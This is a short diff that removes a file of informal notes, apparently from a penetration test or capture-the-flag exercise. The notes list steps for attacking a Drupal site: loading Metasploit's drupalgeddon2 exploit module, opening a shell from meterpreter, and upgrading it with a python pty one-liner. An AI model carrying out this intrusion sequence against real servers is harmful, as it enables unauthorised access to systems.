@@ -1,6 +1,0 @@
-1.msf use exploit(unix/webapp/drupal_drupalgeddon2)
-2.meterpreter>shell
-3.pump shell in python(no the real shell
-python -c 'import pty;pty.spawn("/bin/bash")'
-4.see what i can do
-
